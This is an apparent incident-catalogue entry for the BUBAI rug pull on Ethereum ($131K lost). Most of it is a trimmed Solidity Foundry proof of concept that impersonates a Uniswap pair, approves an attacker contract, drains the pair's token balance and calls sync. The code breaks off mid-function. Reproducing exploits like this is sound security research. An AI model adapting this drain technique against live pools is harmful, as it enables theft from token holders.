# [?] BUBAI - Rug pull

## Summary
Severity: Unknown
Chain: Ethereum
Component: BUBAI
Published: 2024-10-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/BUBAI_exp.sol
Type: defi-exploit-poc

## Details
Lost: $131K

```solidity
contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 21074245);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();

        vm.startPrank(UniswapV2Pair);
        IORAAI(ORAAI).approve(address(attC), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker, attacker);
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

contract AttackerC is Test {
    receive() external payable {}

    function attack() public {
        IORAAI(ORAAI).approve(UniswapV2Router02, type(uint256).max);

        uint256 pairBal = IORAAI(ORAAI).balanceOf(UniswapV2Pair);

        IORAAI(ORAAI).transferFrom(UniswapV2Pair, address(this), pairBal - 100);

        (bool s1, ) = UniswapV2Pair.call(abi.encodeWithSelector(IUniV2Pair.sync.selector));
        require(s1);
    
        uint256 bal = IORAAI(ORAAI).balanceOf(address(this));
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-10/BUBAI_exp.sol_
